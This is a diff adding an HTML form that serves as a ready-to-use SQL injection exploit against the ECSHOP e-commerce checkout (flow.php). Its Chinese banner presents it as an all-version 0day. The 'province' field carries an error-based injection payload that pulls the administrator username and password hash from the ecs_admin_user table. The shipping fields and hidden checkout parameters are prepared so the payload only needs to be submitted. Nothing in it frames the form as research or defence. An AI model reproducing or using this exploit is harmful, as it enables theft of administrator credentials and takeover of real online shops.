@@ -1,0 +1,65 @@
+  <form action="http://localhost/flow.php" method="post" name="theForm" id="theForm">
+              <div class="flowBox">
+       <div style="background:url(themes/cafe2/images/bg_01.jpg) repeat-x;width:100%; height:28px; margin:0px; font-size:14px; color:#000; font-weight:bold; text-align:center; line-height:28px;">&nbsp;&nbsp;ECSHOP全版本注入0DAY:以会员身份把任意商品加入购物车,然后填写相关信息在提交EXP即可</div>
+<table class="flowtb" align="center" border="0" cellpadding="5" cellspacing="1" bgcolor="#dddddd">
+    
+  <tr>
+    <td align="left"  bgcolor="#ffffff">配送区域:</td>
+    <td align="left"  colspan="3" bgcolor="#ffffff">
+    <select name="country" id="selCountries_0" onchange="region.changed(this, 1, 'selProvinces_0')" style="border:1px solid #ccc;">
+        <option value="0">请选择国家</option>
+                <option value="1" selected>中国</option>
+              </select>
+			  <input name="province" type="text" class="inputBg" size="80" value="province=3') and (select 1 from(select count(*),concat((select (select (SELECT concat(user_name,0x7c,password,0x7c) FROM ecs_admin_user limit 0,1)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) and 1=1 #" />
+     <!--<select name="province" id="selProvinces_0" onchange="region.changed(this, 2, 'selCities_0')" style="border:1px solid #ccc;">
+                <option value="2" >北京</option>
+              </select>-->
+      <select name="city" id="selCities_0" onchange="region.changed(this, 3, 'selDistricts_0')" style="border:1px solid #ccc;">
+		<option value="52">北京</option>
+              </select>
+      <select name="district" id="selDistricts_0" style="display:none" style="border:1px solid #ccc;">
+		<option value="500">东城区</option>
+              </select>
+    (必填) </td>
+  </tr>
+    <tr>
+    <td align="left"  bgcolor="#ffffff">收货人姓名:</td>
+    <td align="left"  bgcolor="#ffffff"><input name="consignee" type="text" class="inputBg" id="consignee_0" value="" />
+    (必填) </td>
+    <td align="left"  bgcolor="#ffffff">电子邮件地址:</td>
+    <td align="left"  bgcolor="#ffffff"><input name="email" type="text" class="inputBg"  id="email_0" value="1212@qq.com" />
+    (必填)</td>
+  </tr>
+    
+  <tr>
+    <td align="left"  bgcolor="#ffffff">详细地址:</td>
+    <td align="left"  bgcolor="#ffffff"><input name="address" type="text" class="inputBg"  id="address_0" value="" />
+    (必填)</td>
+    <td align="left"  bgcolor="#ffffff">邮政编码:</td>
+    <td align="left"  bgcolor="#ffffff"><input name="zipcode" type="text" class="inputBg"  id="zipcode_0" value="" /></td>
+  </tr>
+    <tr>
+    <td align="left"  bgcolor="#ffffff">电话:</td>
+    <td align="left"  bgcolor="#ffffff"><input name="tel" type="text" class="inputBg"  id="tel_0" value="" />
+    (必填)</td>
+    <td align="left"  bgcolor="#ffffff">手机:</td>
+    <td align="left"  bgcolor="#ffffff"><input name="mobile" type="text" class="inputBg"  id="mobile_0" value="" /></td>
+  </tr>
+    
+  <tr>
+    <td align="left"  bgcolor="#ffffff">标志建筑:</td>
+    <td align="left"  bgcolor="#ffffff"><input name="sign_building" type="text" class="inputBg"  id="sign_building_0" value="" /></td>
+    <td align="left"  bgcolor="#ffffff">最佳送货时间:</td>
+    <td align="left"  bgcolor="#ffffff"><input name="best_time" type="text"  class="inputBg" id="best_time_0" value="" /></td>
+  </tr>
+    <tr>
+    <td  colspan="4" align="center" bgcolor="#ffffff">
+    <input type="submit" name="Submit" class="bnt_blue_2" value="配送至这个地址" />
+            <input type="hidden" name="step" value="consignee" />
+      <input type="hidden" name="act" value="checkout" />
+      <input name="address_id" type="hidden" value="" />
+      </td>
+  </tr>
+</table>
+</div>            </form>
+             
